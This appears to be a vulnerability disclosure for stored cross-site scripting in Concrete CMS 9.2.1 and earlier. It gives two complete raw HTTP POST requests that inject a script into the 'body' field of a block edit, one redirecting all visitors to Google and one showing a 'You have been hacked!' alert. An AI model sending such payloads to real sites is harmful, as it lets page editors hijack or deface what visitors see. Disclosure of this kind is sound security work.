BUG_Author:
LJWIIE

Affected version:
Concrete CMS

Vendor:
https://www.concretecms.org/

Software:

https://www.concretecms.org/download

https://github.com/concretecms/concretecms/releases/tag/9.2.1

Vulnerability File:
index.php/ccm/system/dialogs/block/edit.php, function submit()

Description:

In Concrete CMS versions 9.2.1 and earlier, authenticated users can execute Stored Cross-Site Scripting (XSS) attacks via the "body" parameter in the "Edit Feature Link" function. This may lead to harmful actions such as redirects, unwanted ads, and executing malicious HTML code, posing risks to visitors and the site's integrity.

Status: Medium

POST parameter 'body' contains a Stored Cross-Site Scripting (XSS) vulnerability

[Redirect to Google official website]Payload1:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695391704:f08febc0b74c604e3155a7c1dae52c5b&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1659 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1952
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTHazfOhCNYBmeP8N
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE=tpv8secu9t64ob26vf7ci5mlar; CONCRETE_LOGIN=1
Connection: close

------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="title"

Leverage agile frameworks to provide a robust synopsis
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="titleFormat"

h2
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>
<script type="text/javascript">
        window.onload = function() {
            window.location.href = 'https://www.google.com';
        };
</script><p>

------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonText"

Learn More
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="icon"


------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundaryTHazfOhCNYBmeP8N--
```

![image](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/c20eeb0d-78a7-4f65-a48a-c0e81469355e)

After editing and saving, anyone who visits this page will be forced to go to the Google website.

![RedirectToGoogle](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/3d2ed4e1-abec-4053-8166-5bdf198de7bd)

[Display alert window]Payload2:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695391704:f08febc0b74c604e3155a7c1dae52c5b&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1659 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1831
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTHazfOhCNYBmeP8N
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE=tpv8secu9t64ob26vf7ci5mlar; CONCRETE_LOGIN=1
Connection: close

------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="title"

Leverage agile frameworks to provide a robust synopsis
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="titleFormat"

h2
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>
<script>alert("You have been hacked!")</script><p>

------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonText"

Learn More
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="icon"


------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundaryTHazfOhCNYBmeP8N
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundaryTHazfOhCNYBmeP8N--
```
![image](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/8eb05aa6-b84c-4839-994f-78b318a3e324)

![image](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/aa0a61ad-c1c2-4903-8019-a1fa9a4f060c)



![image-20230922222030311](C:\Users\ljw\AppData\Roaming\Typora\typora-user-images\image-20230922222030311.png)



